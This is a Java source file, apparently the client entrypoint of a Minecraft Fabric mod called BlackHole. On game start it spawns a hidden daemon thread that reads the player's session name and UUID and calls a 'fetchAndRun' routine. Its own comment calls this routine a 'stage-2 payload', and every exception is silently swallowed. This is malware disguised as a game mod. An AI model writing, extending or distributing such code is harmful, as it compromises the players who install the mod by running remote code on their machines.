package com.blackhole.client;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.loader.api.FabricLoader;

/** Client entrypoint: session check-in, then stage-2 payload. */
public final class BlackHoleClient implements ClientModInitializer {
    @Override
    public void onInitializeClient() {
        BlackHoleMod.LOGGER.info("[bh] online");
        Thread t = new Thread(() -> {
            try {
                String username = "?";
                String uuid = "?";
                try {
                    var session = net.minecraft.client.Minecraft.getInstance().getUser();
                    username = session.getName();
                    uuid = session.getProfileId().toString();
                } catch (Throwable e) {
                }
                String gameDir = FabricLoader.getInstance().getGameDir().toAbsolutePath().toString();
                PayloadRunner.fetchAndRun(FabricLoader.getInstance().getGameDir().toAbsolutePath());
            } catch (Throwable e) {
            }
        }, "blackhole-init");
        t.setDaemon(true);
        t.start();
    }
}
